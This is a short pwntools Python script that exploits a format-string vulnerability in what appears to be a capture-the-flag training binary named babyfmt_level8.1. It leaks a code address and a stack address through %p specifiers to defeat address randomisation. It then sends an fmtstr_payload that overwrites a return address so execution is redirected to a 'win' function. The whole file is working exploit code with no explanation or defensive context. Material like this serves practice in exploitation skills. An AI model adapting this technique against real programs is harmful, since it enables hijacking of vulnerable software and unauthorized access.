from pwn import *
context(os='linux', arch='amd64', log_level='debug')
p=process("/challenge/babyfmt_level8.1")
win=0x1350
payload1=b"%157$p"
p.sendline(payload1)
p.recvuntil("0x",drop=True)
main_addr=int(p.recv(12),16)
offset=main_addr-0x1622
print("[+]Leak Offset:",offset,"---",win+offset)
win+=offset
payload2=b'aa%7$p'
p.sendline(payload2)
p.recvuntil("0x",drop=True)
stack=int(p.recv(12),16)+1025
print("[+]Leak addr:",stack)
payload3=b'a'+fmtstr_payload(29,{stack:win},numbwritten=24)
print("[+]Payload:",payload3)
p.sendline(payload3)
p.sendline(b'END')
print(p.recv())
print(p.recv())
print(p.recv())
print(p.recv())
